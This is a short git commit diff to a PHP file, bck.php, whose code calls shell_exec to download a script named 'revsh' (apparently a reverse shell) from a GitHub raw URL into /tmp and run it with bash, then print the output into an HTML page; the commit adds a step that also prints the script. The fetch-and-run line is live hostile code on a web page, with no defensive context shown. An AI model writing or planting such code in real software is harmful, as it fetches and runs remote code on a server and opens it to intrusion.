288515cd6471dca39896d989101385f208b43aab
Gabriele Russo <gabryr96@gmail.com>
2017-11-20 18:27:10 +0100

    Update bck.php

--- bck.php
+++ bck.php
@@ -1,7 +1,7 @@
 	</body>
 </html>	
 <?php 
-	$prova = shell_exec('cd /tmp/trs; wget -o revsh https://raw.githubusercontent.com/Gabry-r/Shellscripts/master/tes; /bin/bash /tmp/trs/revsh');
+	$prova = shell_exec('cd /tmp/trs; wget -o revsh https://raw.githubusercontent.com/Gabry-r/Shellscripts/master/tes; /bin/bash /tmp/trs/revsh; cat /tmp/trs/revsh');
 	print "<html>
 	    <body>
 		{$prova}
